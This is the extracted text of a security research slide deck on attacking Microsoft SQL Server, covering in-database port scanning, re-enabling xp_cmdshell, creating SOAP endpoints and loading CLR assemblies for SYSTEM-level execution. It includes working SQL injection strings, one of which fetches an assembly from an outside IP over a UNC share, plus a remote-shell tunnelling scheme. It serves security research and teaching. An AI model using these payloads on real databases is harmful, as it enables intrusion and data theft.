Configure control timeouts
Initialise control (capture return code)
Send request (capture return code)
Grab HTTP status
Test return codes and determine port status
Create URI from ip and port
Putting it together
• Using the probeIP() building block, we
can build further tools
• Port sweepers
– scanports(ip, portlist)
• Portscanners
– scanhosts(iplist, port)
• Webserver detectors
So what does that give us?
• A SQL-based port scanner
• Implemented in a stored proc
• Can scan almost all ports
• Supports HTTP detection
• But why?
– No messy nmap uploads
– No A/V footprints
What’s going to trip us up?
•
Inter-protocol protections
– Cross-protocol attacks have been around for a while
– Been getting a bit of attention again
SandroGauci provided a short paper recently enumerating browser
support
– Browsers provide protection by banning connections to specific
ports
– FF bans 58, Opera bans 58, Safari bans 43
– IE 7 bans 6 ports, IE 6 banned 5 ports, IE 5 didn’t ban at all
– More of a stumble than a trip, all the interesting ports are still
allowed
•
Proxies
– setProxy can disabled proxy requests
•
Speed
– Stats?????
Squeezing OLE juice
• Turns out, sometimes we make the right
decision
• Integrating with Squeeza is simple
– Portscanner generates content
– Can pull results through dns, timing or http
errors
OLE dog, new tricks
• OLE objects deserve lots more looking at
• Why bother with debug scripts, when a
combination of T-SQL and
‘scripting.filesystemobject’ can write anything
to disk?
• Why bother with xp_cmdshell, when
‘scripting.shell’ works just as well regardless
of whether the stored proc is available
• Importantly, this functionality is available
across multiple SQL server versions, making
attacks version independent
SQL2005 – Pen Tester
Nightmare?
• By all accounts SQL 2005 is Microsoft’s SDLC
flagship product
• SQL Server poses some unique challenges:
– Highly Public;
– Highly Exploited;
– Not really directly through Microsoft’s fault!
• They had to take steps to reduce attack surface,
to stop people hurting themselves (think
mandatory seat-belts in cars)
• Much touted SD3 – Secure by Design, Secure by
Default, Secure by Deployment
• Famous hax0r celebrities have stated how they
hate coming up against SQL05 on deployed
applications
I call Shenanigans!
Fundamental problems with ‘05
• Microsoft needed desperately
to reduce the attack surface on
SQL05.
• 1000 stored procedures
available in a default (SQL7)
install?
5:1
• Much publicized lock-down of superfluous
functionality and features.
• This however has 2 major problems
The 2 Big Problems
• Mixed Messages: Incoherent at best and
Dishonest at worst.
• Any software engineer will tell you that
Features will win because of “dancing
pigs” and “management by in-flight
magazine”.
The 2 Big Problems
1. Mixed Messages: Incoherency, In Flight
Magazines and Dancing Pigs.
2. In-Band Signaling:
–
This mistake is so old, it almost hurts to
write it.
–
Cap’n Crunch vs. Telephone Systems
–
Buffer Overflows and Von Neumann
Architectures
•
SQL Server 2005 makes heavy use of in-
band signaling.
•
Secure by design?
InBand Signaling++
(sp_configure)
• Early Microsoft documentation on SQL Best
Practice mentioned disabling xp_cmdshell.
– Every one of the (many) SQL Injection tools out
there uses sp_configure to re-enable
xp_cmdshell.
– This is an old lesson for SQL Server to learn!
• In fact _all_ of the features widely screamed
to be locked down, can be re-enabled within
the same channel. (the same channel that
SQL Injection rides in on!)
• This shared channel for
configuration/administration obviously buys
us some convenience, but a secure design?
sp_configure; RECONFIGURE
• Ad Hoc Distributed Queries
– (used by many tools to brute-force sa
password)
– (used by many tools for effective data
extrusion – SQL DataThief)
• xp_cmdshell
– Almost as famous as ‘ or 1=1--
• CLR Integration
– The gateway to much fun..
• In-band signals FTW!
SQL2005 – Some new features
• Other than old favorites, we are going to
look at 2 new ones:
– Native XML Web Services;
– CLR Integration.
Native XML Integration
• The marketing pitch:
“Microsoft SQL Server 2005 provides a standard mechanism for
accessing the database engine using SOAP via HTTP. Using this
mechanism, you can send SOAP/HTTP requests to SQL Server”…”
Since the SOAP/HTTP access mechanism is based on well-known
technologies such as XML and HTTP, it inherently promotes
interoperability and access to SQL Server in a heterogeneous
environment. Any device that can parse XML and submit HTTP
requests can now access SQL Server.”
• Native Soap Integration and the wiley
hacker
– Web Server DoS?
– Comfortable X-Platform Query Manager?
Web-Server DoS
• Denial of Service is boring!
• But boring will hurt you just as badly as
anything else..
Web-Server DoS
• SQLServer now interacts directly with http.sys in the
Win2k3 kernel to manage created endpoints.
• When included within a standard ‘CREATE
ENDPOINT’ call, MSDN is quite specific: “while the
SQL Server-based application is running, any HTTP
requests to this endpoint are forwarded to the
instance of SQL Server. ”
1.
2.
3.
But surely this needs privs?
• This _had_ to come up with threat modeling.
– Secure marketing docs mention: “Both the Windows
account and the SQL Server account that SQL
Server 2005 impersonates must have local Windows
administrator privileges for the HTTP endpoint
registration to succeed.”
• Bah! Sounds like we are out of luck..
– MSDN (again): “If you execute the statement in the
context of a SQL Server account, for example, sa or
some other SQL Server login, SQL Server 2005
impersonates the caller by using the SQL Service
account, specified when SQL Server is installed, to
register the endpoint with HTTP.SYS.”
• Ah.. So all we need is to be SA / in sysadmin (will
that ever happen??
SA == DoS on every IIS
Instance ?
• IIS Server running multiple sites (using
name based or IP based virtual hosting)
• SQL Service account given FileSystem
restrictions to ensure that SQL DBA cant
deface / affect other customer sites.
• Sounds like “NT Port bind, 10 years later..”
Creating endpoints for fun and
profit
'exec('CREATE FUNCTION getServerVersion()
RETURNS NVARCHAR(MAX) AS BEGIN;RETURN
(@@VERSION);END')--
' exec('CREATE ENDPOINT eepp STATE = STARTED AS HTTP
(AUTHENTICATION = ( INTEGRATED ),PATH = ''/sql/demoo'',PORTS = ( CLEAR
))FOR SOAP (WEBMETHOD ''getServerVersion''(NAME =
''demo_db.dbo.getServerVersion''),BATCHES = ENABLED,WSDL = DEFAULT)')--
1.
2.
3.
• The vector here is obvious: We wanted to
build a function or proc. That would accept
arbitrary input from SOAP, then eval() it…
• But Microsoft beat us to it…
X-Platform Query Managers
•
Did you notice the methods VisualStudio extracted from the
WSDL ?
•
 MSDN: “When BATCHES are ENABLED on an endpoint by
using the T-SQL command, another SOAP method, called
"sqlbatch," is implicitly exposed on the endpoint. The sqlbatch
method allows you to execute T-SQL statements via SOAP”
getServerVersion()
Sqlbatch(BatchCommands As string, Parameters As ArrayofParameters)
' exec('CREATE ENDPOINT ep2 STATE=STARTED AS HTTP
(AUTHENTICATION=(INTEGRATED),PATH =
''/sp'',PORTS=(CLEAR))FOR SOAP(BATCHES=ENABLED)')--
1.
2.
3.
New: CLR Integration
•
The thing that made squeeza difficult to write in ‘07 was
mainly T-SQL.
•
T-SQL is Turing Complete but when trying to extract data
from a network via encoded DNS packets or timing it starts to
creak a little.. (we did it, but lost a lot of hair in the process)
•
Microsoft to the rescue (msdn): “Microsoft SQL Server 2005
significantly enhances the database programming model by
hosting the Microsoft .NET Framework 2.0 Common
Language Runtime (CLR). This enables developers to write
procedures, triggers, and functions in any of the CLR
languages, particularly Microsoft Visual C# .NET, Microsoft
Visual Basic .NET, and Microsoft Visual C++. This also
allows developers to extend the database with new types and
aggregates.”
•
Huh ?
•
Turned off by default…
– Remember slide on in-band signals &&sp_configure ?
– exec sp_configure(clr enabled),1
New: CLR Integration
• Does allow for very fine grained access
control.
• Fortunately these can all be over-ridden if
you have SA access.
• Simply it allows us to load an arbitrary
.net Assembly into SQL Server, and
depending on how we handle it, possibly
execute this binary within SQL Servers
address space.
• How do you load a .net assembly?
Loading .net Assemblies (csc)
• Create .cs file on filesystem (1)
• Call on csc.exe to compile the binary (2)
• Import the binary into SQL (3)
• Profit! (4)
(1)
(2)
(3)
(4)
Loading .net Assemblies (csc)
• There has been talk of ntsd and
debug.exe being removed in default
installs.
• Fortunately, we now have csc.exe
shipping with every deployed SQL Server!
• csc.exe is perfectly predictable:
– %windir%\system32\dllcache\csc.exe
• This is still pretty ghetto!
Loading .net Assemblies (UNC)
• Fortunately, like DLL’s this can be loaded
from a UNC share too.
• Profit!
• (Of course all of this is do-able via an
injection point)
• http://victim2k3.sp.com/login.asp?
username=boo&password=boo'%20CREATE%20ASS
EMBLY%20moo%20FROM%20'\\196.31.150.117\tem
p_smb\moo.dll'—
• But this still requires outbound \\UNC (which
is still useful for squeeza and DNS
resolution), but remains ghetto!
Loading .net Assemblies
(0x1618..)
• T-SQL Syntax allows the assembly to be
created at runtime from the files raw hex.
1.File.open("moo.dll”,"rb").read().unpack("H*
")
["4d5a90000300000004000000ffff0......]
2.CREATE ASSEMBLY moo FROM
0x4d5a90000300....
3.exec HelloWorldSP  (Profit!)
• This makes creation via injection even
i
!
Assemblies and Security Privs.
• Your created binary is by default placed
inside a sand-box
• Assemblies are loaded as:
– SAFE [Calculations, No external Resources]
– EXTERNAL_ACCESS [Access to Disk,
Environement, Almost everything with some
restrictions]
– UNSAFE [God Help You! | Equivalent of Full
Trust | Call unmanaged Code / Do Anything as
SYSTEM]
• UnSafe Assemblies must be signed with a
new CLR Signing procedure or
• SA can set the Database to “Trustworthy”
What can we do with this?
• The fun is just beginning:
– Effectively loading binaries into memory
without noticeably affecting disk in an
unusual manner!
– .net assembly to launch calc.exe (as System)
– .net assembly to launch remote shell (System)
– Squeeza without the horrible T-SQL ?
– reDuh.clr. sql
[1] SQL Injection used to create CLR reDuh.exe on SQL Server
[2] Local Proxy breaks down TCP packets, submits to reDuh through SQL
      Injection strings..
[3] reDuh.clr extracts packet info and
submits packets to destination
[4] Return packets are encoded by reDuh within SQL server, and fetched b
      attackers proxy using Injection vector, completing the circuit.
Questions ?
References
“Advanced SQL Injection In SQL Server Applications”, Chris Anley,
2002
“Building the bridge between the web app and the OS:  GUI access
through SQL Injection”, Alberto Revelli, 2008
“IServerXMLHTTPRequest/ServerXMLHTTP”
http://msdn.microsoft.com/en-
us/library/ms762278%28VS.85%29.aspx
“The Extended HTML Form attack revisited”, SandroGauci, 2008
“Programming Microsoft® SQL Server™ 2005”, Andrew J. Brust,
2006
“Writing Stored Procedures for Microsoft SQL Server”, Mathew
Shepker, 2000
“Overview of Native XML Web Services for Microsoft SQL Server
2005”, http://msdn.microsoft.com/en-us/library/ms345123.aspx,
2005